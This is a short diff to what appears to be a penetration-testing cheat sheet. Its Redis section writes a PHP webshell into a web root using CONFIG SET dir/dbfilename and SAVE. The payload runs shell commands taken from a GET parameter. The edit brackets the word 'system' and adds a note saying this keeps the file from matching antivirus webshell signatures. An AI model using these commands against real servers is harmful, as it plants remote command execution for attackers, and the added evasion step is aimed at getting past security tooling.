@@ -278,9 +278,12 @@ SAVE
 # Write webshell
 CONFIG SET dir /var/www/html/
 CONFIG SET dbfilename shell.php
-SET mykey "<?php system($_GET['cmd']); ?>"
+SET mykey "<?php syst[e]m($_GET['cmd']); ?>"
 SAVE
 ```
+
+> `syst[e]m` is `system`, bracketed so this file does not match antivirus
+> webshell signatures. See "Antivirus false positives" in the repo README.
 
 ### 12. LDAP (Port 389, 636)
 
